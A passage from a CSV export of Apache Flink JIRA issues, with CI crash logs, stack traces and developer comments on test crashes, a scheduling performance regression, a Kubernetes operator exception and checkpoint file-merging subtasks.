 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-32105,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 15 08:36:57 UTC 2023,,,,,,,,,,"0|z1hvzs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/May/23 07:16;yunta;[~samrat007] Thanks for the reporting, I will fix this problem.;;;","15/May/23 07:26;samrat007;[~yunta] :+1;;;","15/May/23 08:36;yunta;Already resolved, merged in master: 983035c1799ae985b6dbcac5320de4b8a866819f;;;",,,,,,,,,,,,,,,,,,,,
HiveDialectITCase crashed with exit code 239,FLINK-32095,13536158,13537639,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,Weijie Guo,Weijie Guo,15/May/23 04:13,25/May/23 10:57,04/Jun/24 20:41,15/May/23 08:30,1.17.1,,,,,,,,,,,,,,,,,,,,,,,,0,,,,"https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48957&view=logs&j=fc5181b0-e452-5c8f-68de-1097947f6483&t=995c650b-6573-581c-9ce6-7ad4cc038461&l=22740

May 13 02:10:09 [ERROR] Crashed tests:
May 13 02:10:09 [ERROR] org.apache.flink.connectors.hive.HiveDialectITCase
May 13 02:10:09 [ERROR] at org.apache.maven.plugin.surefire.booterclient.ForkStarter.awaitResultsDone(ForkStarter.java:532)
May 13 02:10:09 [ERROR] at org.apache.maven.plugin.surefire.booterclient.ForkStarter.runSuitesForkPerTestSet(ForkStarter.java:479)
May 13 02:10:09 [ERROR] at org.apache.maven.plugin.surefire.booterclient.ForkStarter.run(ForkStarter.java:322)
May 13 02:10:09 [ERROR] at org.apache.maven.plugin.surefire.booterclient.ForkStarter.run(ForkStarter.java:266)
May 13 02:10:09 [ERROR] at org.apache.maven.plugin.surefire.AbstractSurefireMojo.executeProvider(AbstractSurefireMojo.java:1314)
May 13 02:10:09 [ERROR] at org.apache.maven.plugin.surefire.AbstractSurefireMojo.executeAfterPreconditionsChecked(AbstractSurefireMojo.java:1159)
May 13 02:10:09 [ERROR] at org.apache.maven.plugin.surefire.AbstractSurefireMojo.execute(AbstractSurefireMojo.java:932)
May 13 02:10:09 [ERROR] at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:132)
May 13 02:10:09 [ERROR] at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:208)
May 13 02:10:09 [ERROR] at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
May 13 02:10:09 [ERROR] at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
May 13 02:10:09 [ERROR] at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:116)
May 13 02:10:09 [ERROR] at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:80)
May 13 02:10:09 [ERROR] at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build(SingleThreadedBuilder.java:51)
May 13 02:10:09 [ERROR] at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:120)
May 13 02:10:09 [ERROR] at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:355)
May 13 02:10:09 [ERROR] at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:155)
May 13 02:10:09 [ERROR] at org.apache.maven.cli.MavenCli.execute(MavenCli.java:584)
May 13 02:10:09 [ERROR] at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:216)
May 13 02:10:09 [ERROR] at org.apache.maven.cli.MavenCli.main(MavenCli.java:160)
May 13 02:10:09 [ERROR] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
May 13 02:10:09 [ERROR] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
May 13 02:10:09 [ERROR] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
May 13 02:10:09 [ERROR] at java.lang.reflect.Method.invoke(Method.java:498)
May 13 02:10:09 [ERROR] at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:289)
May 13 02:10:09 [ERROR] at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:229)
May 13 02:10:09 [ERROR] at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:415)
May 13 02:10:09 [ERROR] at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:356)
May 13 02:10:09 [ERROR] Caused by: org.apache.maven.surefire.booter.SurefireBooterForkException: The forked VM terminated without properly saying goodbye. VM crash or System.exit called?
May 13 02:10:09 [ERROR] Command was /bin/sh -c cd /__w/1/s/flink-connectors/flink-connector-hive && /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -XX:+UseG1GC -Xms256m -Xmx1536m -jar /__w/1/s/flink-connectors/flink-connector-hive/target/surefire/surefirebooter2973058874035532114.jar /__w/1/s/flink-connectors/flink-connector-hive/target/surefire 2023-05-13T01-46-05_580-jvmRun3 surefire1860158651016882706tmp surefire_277931085391834517755tmp
",,,,,,,,,,,,,,,,,,,,FLINK-30140,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 15 08:43:56 UTC 2023,,,,,,,,,,"0|z1hvw8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/May/23 08:30;mapohl;The exit code 239 indicates that a fatal error occurred that was handled by the \{{FatalExitExceptionHandler}}. The Maven logs reveal the actual cause of the error which is related to FLINK-30140.
{code:java}
02:10:08,114 [flink-akka.actor.default-dispatcher-5] ERROR org.apache.flink.util.FatalExitExceptionHandler              [] - FATAL: Thread 'flink-akka.actor.default-dispatcher-5' produced an uncaught exception. Stopping the process...
java.lang.NoClassDefFoundError: akka/actor/dungeon/FaultHandling$$anonfun$handleNonFatalOrInterruptedException$1
        at akka.actor.dungeon.FaultHandling.handleNonFatalOrInterruptedException(FaultHandling.scala:336) ~[flink-rpc-akka_606a8e07-1a2e-4f3c-afcb-2d0a8e688afb.jar:1.17-SNAPSHOT]
        at akka.actor.dungeon.FaultHandling.handleNonFatalOrInterruptedException$(FaultHandling.scala:336) ~[flink-rpc-akka_606a8e07-1a2e-4f3c-afcb-2d0a8e688afb.jar:1.17-SNAPSHOT]
        at akka.actor.ActorCell.handleNonFatalOrInterruptedException(ActorCell.scala:410) ~[flink-rpc-akka_606a8e07-1a2e-4f3c-afcb-2d0a8e688afb.jar:1.17-SNAPSHOT]
        at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523) ~[flink-rpc-akka_606a8e07-1a2e-4f3c-afcb-2d0a8e688afb.jar:1.17-SNAPSHOT]
        at akka.actor.ActorCell.systemInvoke(ActorCell.scala:535) ~[flink-rpc-akka_606a8e07-1a2e-4f3c-afcb-2d0a8e688afb.jar:1.17-SNAPSHOT]
        at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:295) ~[flink-rpc-akka_606a8e07-1a2e-4f3c-afcb-2d0a8e688afb.jar:1.17-SNAPSHOT]
        at akka.dispatch.Mailbox.run(Mailbox.scala:230) ~[flink-rpc-akka_606a8e07-1a2e-4f3c-afcb-2d0a8e688afb.jar:1.17-SNAPSHOT]
        at akka.dispatch.Mailbox.exec(Mailbox.scala:243) [flink-rpc-akka_606a8e07-1a2e-4f3c-afcb-2d0a8e688afb.jar:1.17-SNAPSHOT]
        at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:175) [?:1.8.0_292]
Caused by: java.lang.ClassNotFoundException: akka.actor.dungeon.FaultHandling$$anonfun$handleNonFatalOrInterruptedException$1
        at java.net.URLClassLoader.findClass(URLClassLoader.java:382) ~[?:1.8.0_292]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:418) ~[?:1.8.0_292]
        at org.apache.flink.core.classloading.ComponentClassLoader.loadClassFromComponentOnly(ComponentClassLoader.java:150) ~[flink-core-1.17-SNAPSHOT.jar:1.17-SNAPSHOT]
        at org.apache.flink.core.classloading.ComponentClassLoader.loadClass(ComponentClassLoader.java:113) ~[flink-core-1.17-SNAPSHOT.jar:1.17-SNAPSHOT]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:351) ~[?:1.8.0_292]
        ... 12 more {code}
I'm gonna close this issue as a duplicate of FLINK-30140. Thanks for reporting it, [~Weijie Guo] ;;;","15/May/23 08:43;Weijie Guo;Thanks [~mapohl] for pointing out this! I have also updated the issue link in slack's build channel. ;;;",,,,,,,,,,,,,,,,,,,,,
startScheduling.BATCH performance regression since May 11th,FLINK-32094,13536145,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,tanyuxin,martijnvisser,martijnvisser,14/May/23 21:57,15/May/23 13:35,04/Jun/24 20:41,15/May/23 13:34,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,,,,http://codespeed.dak8s.net:8000/timeline/#/?exe=5&ben=startScheduling.BATCH&extr=on&quarts=on&equid=off&env=2&revs=200,,,,,,,,,,,,,,,,,,,,,FLINK-31635,,,,,,,,,,,"14/May/23 21:58;martijnvisser;image-2023-05-14-22-58-00-886.png;https://issues.apache.org/jira/secure/attachment/13058161/image-2023-05-14-22-58-00-886.png","15/May/23 04:33;Thesharing;image-2023-05-15-12-33-56-319.png;https://issues.apache.org/jira/secure/attachment/13058168/image-2023-05-15-12-33-56-319.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 15 13:35:04 UTC 2023,,,,,,,,,,"0|z1hvtc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/May/23 03:59;Weijie Guo;This may caused by FLINK-31635, [~tanyuxin] would you mind taking a look at this?;;;","15/May/23 04:35;Thesharing;The extra cost may be caused by {{{}TieredStorageIdMappingUtils#convertId(ResultPartitionID resultPartitionId){}}}.

!image-2023-05-15-12-33-56-319.png|height=75%,width=75%!;;;","15/May/23 08:20;tanyuxin;Thanks [~martijnvisser] and [~Thesharing].

I reproduced the issue locally. 
To address the issue, I have submitted a PR(https://github.com/apache/flink/pull/22578) to prevent the creation of the tiered internal shuffle master until tiered storage is enabled. 
Furthermore, to ensure that the issue does not reoccur, we will address the regression issue before proceeding with the enablement of tiered storage.;;;","15/May/23 13:35;Weijie Guo;master(1.18) via 1a3b539fa43b4e1c8f07accf2d4aa352b7f63858.;;;",,,,,,,,,,,,,,,,,,,
Upon Delete deployment idle pods throw - java.lang.IllegalStateException: Cannot receive event after a delete event received,FLINK-32093,13536133,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,tamirsagi,tamirsagi,14/May/23 16:21,31/Aug/23 07:02,04/Jun/24 20:41,,kubernetes-operator-1.5.0,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,,,,"After a deployment is deleted , idle pods throw java.lang.IllegalStateException: Cannot receive event after a delete event received

HA is enabled.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/May/23 16:19;tamirsagi;event-error.txt;https://issues.apache.org/jira/secure/attachment/13058160/event-error.txt",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 31 07:02:21 UTC 2023,,,,,,,,,,"0|z1hvqo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/May/23 16:24;gyfora;Can you share the operator logs?

Does this also happen without HA?;;;","14/May/23 16:35;tamirsagi;There are no much logs from the idles pods.

either the stack I attached or info logs regarding configurations
[Info] {} [o.a.f.c.GlobalConfiguration]: Loading configuration property...

 

as for disabling HA, I will try tomorrow and get back to you.;;;","14/May/23 16:39;gyfora;By HA again here you mean Flink Job HA? or Operator HA (leader election)?;;;","14/May/23 17:13;tamirsagi;I'm talking about Operator HA not Job HA.;;;","14/May/23 17:27;gyfora;Can you please share both the operator and the FlinkDeployment configuration?;;;","31/Aug/23 07:02;gyfora;[~tamirsagi] is this still a problem?;;;",,,,,,,,,,,,,,,,,
Integrate snapshot file-merging with existing IT cases,FLINK-32092,13536059,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Resolved,Yanfei Lei,zakelly,zakelly,13/May/23 04:45,16/May/24 02:13,04/Jun/24 20:41,16/May/24 02:12,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 16 02:13:28 UTC 2024,,,,,,,,,,"0|z1hvg0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/24 02:13;Yanfei Lei;Merged into master via b87ead7;;;",,,,,,,,,,,,,,,,,,,,,,
Add necessary metrics for file-merging,FLINK-32091,13536058,13536037,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,masteryhx,zakelly,zakelly,13/May/23 04:45,14/May/23 11:08,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-13 04:45:34.0,,,,,,,,,,"0|z1hvfs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Python API for enabling and configuring file merging snapshot,FLINK-32090,13536057,13536037,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,Yanfei Lei,zakelly,zakelly,13/May/23 04:45,14/May/23 11:08,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-13 04:45:21.0,,,,,,,,,,"0|z1hvfk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Do fast copy in best-effort during first checkpoint after restoration,FLINK-32089,13536056,13536037,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,Yanfei Lei,zakelly,zakelly,13/May/23 04:45,14/May/23 11:07,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-13 04:45:02.0,,,,,,,,,,"0|z1hvfc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Re-uploading in state file-merging for space amplification control,FLINK-32088,13536055,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zakelly,zakelly,zakelly,13/May/23 04:44,30/May/24 06:16,04/Jun/24 20:41,30/May/24 06:16,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 30 06:16:36 UTC 2024,,,,,,,,,,"0|z1hvf4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/May/24 06:16;zakelly;Merged into master via 6ee30947a9184a0b877891a38960dcc80b4a6add;;;",,,,,,,,,,,,,,,,,,,,,,
Space amplification statistics of file merging,FLINK-32087,13536054,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,leiyanfei,zakelly,zakelly,13/May/23 04:44,14/May/24 08:22,04/Jun/24 20:41,14/May/24 08:22,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 14 08:22:03 UTC 2024,,,,,,,,,,"0|z1hvew:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/May/24 08:22;Yanfei Lei;Merged into master via 9a5a99b;;;",,,,,,,,,,,,,,,,,,,,,,
Cleanup non-reported managed directory on exit of TM,FLINK-32086,13536053,13536037,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,Feifan Wang,zakelly,zakelly,13/May/23 04:43,23/Apr/24 02:38,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Apr 23 02:18:00 UTC 2024,,,,,,,,,,"0|z1hveo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/Apr/24 10:17;Feifan Wang;Hi [~Zakelly] , are you still work on this ticket ? We want solve this in 1.20 , I can take this ticket if you don't mind.;;;","23/Apr/24 02:14;zakelly;[~Feifan Wang] I'm not working on this. And [~zhoujira86] are u working on this? Do you mind if [~Feifan Wang] take this.;;;","23/Apr/24 02:18;zhoujira86;[~Zakelly] yes no problem;;;",,,,,,,,,,,,,,,,,,,,
Implement and migrate batch uploading in changelog files into the file merging framework,FLINK-32085,13536052,13536037,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,masteryhx,zakelly,zakelly,13/May/23 04:43,12/Mar/24 06:30,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-34652,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Mar 12 06:30:48 UTC 2024,,,,,,,,,,"0|z1hveg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Mar/24 06:30;masteryhx;Maybe we could discuss about FLINK-34652 firstly which has a bigger scope and also help to resolve this.;;;",,,,,,,,,,,,,,,,,,,,,,
Migrate current file merging of channel state into the file merging framework,FLINK-32084,13536051,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Resolved,Yanfei Lei,zakelly,zakelly,13/May/23 04:43,09/May/24 07:37,04/Jun/24 20:41,09/May/24 07:37,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 09 07:37:22 UTC 2024,,,,,,,,,,"0|z1hve8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"09/May/24 07:37;Yanfei Lei;Merged into master via 4fe66e0;;;",,,,,,,,,,,,,,,,,,,,,,
Chinese translation of documentation of checkpoint file-merging,FLINK-32083,13536050,13536037,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,masteryhx,zakelly,zakelly,13/May/23 04:42,16/May/24 03:22,04/Jun/24 20:41,16/May/24 03:22,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,,,,,,,,,,,,,,,,,,,FLINK-32082,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-13 04:42:45.0,,,,,,,,,,"0|z1hve0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation of checkpoint file-merging,FLINK-32082,13536049,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Resolved,Yanfei Lei,zakelly,zakelly,13/May/23 04:42,16/May/24 07:45,04/Jun/24 20:41,16/May/24 07:45,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,FLINK-32083,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 16 07:45:26 UTC 2024,,,,,,,,,,"0|z1hvds:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/24 07:45;Yanfei Lei;Merged into master via a8cf2ba;;;",,,,,,,,,,,,,,,,,,,,,,
Compatibility between file-merging on and off across job runs,FLINK-32081,13536048,13536037,Sub-task,In Progress,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,lijinzhong,zakelly,zakelly,13/May/23 04:41,04/Jun/24 13:10,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-13 04:41:46.0,,,,,,,,,,"0|z1hvdk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Restoration of FileMergingSnapshotManager,FLINK-32080,13536047,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,lijinzhong,zakelly,zakelly,13/May/23 04:41,07/May/24 09:28,04/Jun/24 20:41,07/May/24 09:28,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 07 09:27:55 UTC 2024,,,,,,,,,,"0|z1hvdc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"07/May/24 09:27;zakelly;Merged via afe4c79efa15902369d41ef5a6e73d79a2e7d525;;;",,,,,,,,,,,,,,,,,,,,,,
Read/write checkpoint metadata of merged files,FLINK-32079,13536046,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,masteryhx,zakelly,zakelly,13/May/23 04:41,10/May/24 11:00,04/Jun/24 20:41,07/Apr/24 02:34,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-35041,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Apr 07 02:34:01 UTC 2024,,,,,,,,,,"0|z1hvd4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"07/Apr/24 02:34;masteryhx;merged ea4e4981 and 0b7f0fde into master;;;",,,,,,,,,,,,,,,,,,,,,,
Implement private state file merging,FLINK-32078,13536045,13536037,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,Yanfei Lei,zakelly,zakelly,13/May/23 04:40,14/Mar/24 09:09,04/Jun/24 20:41,14/Mar/24 09:09,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Mar 14 09:09:54 UTC 2024,,,,,,,,,,"0|z1hvcw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Mar/24 09:09;zakelly;This has been implemented in FLINK-32073 and FLINK-32076. Closing it.;;;",,,,,,,,,,,,,,,,,,,,,,
Implement shared state file merging,FLINK-32077,13536044,13536037,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,zakelly,zakelly,zakelly,13/May/23 04:40,14/Mar/24 09:09,04/Jun/24 20:41,14/Mar/24 09:09,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Mar 14 09:09:22 UTC 2024,,,,,,,,,,"0|z1hvco:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Mar/24 09:09;zakelly;This has been implemented in FLINK-32073 and FLINK-32076. Closing it.;;;",,,,,,,,,,,,,,,,,,,,,,
Add file pool for concurrent file reusing,FLINK-32076,13536043,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
